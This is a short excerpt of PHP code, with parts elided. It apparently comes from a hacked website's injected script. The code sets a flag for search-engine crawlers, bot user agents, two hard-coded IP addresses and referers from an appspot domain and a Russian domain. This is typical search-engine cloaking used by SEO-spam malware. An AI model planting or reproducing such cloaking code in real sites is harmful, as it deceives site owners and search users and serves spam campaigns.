...
if ( searchEngineDetect() !== false ) {
	...
	if ( parse_url( $_SERVER['HTTP_REFERER'] )['host'] == 'ilovezzlotizz.nw.r.appspot.com' ) {
		$asdasd = true;
	}
	if ( isBots( $_SERVER['HTTP_USER_AGENT'] ) != false ) {
		$asdasd = true;
	}
	if ( $_SERVER['REMOTE_ADDR'] == '108.177.14.153' ) {
		$asdasd = true;
	}
	if ( $_SERVER['REMOTE_ADDR'] == '176.50.230.169' ) {
		$asdasd = true;
	}

	if ( ! empty( $_SERVER['HTTP_REFERER'] ) ) {
		if ( parse_url( $_SERVER['HTTP_REFERER'] )['host'] == 'pln-pskov.ru' ) {
			$asdasd = true;
		}
	}
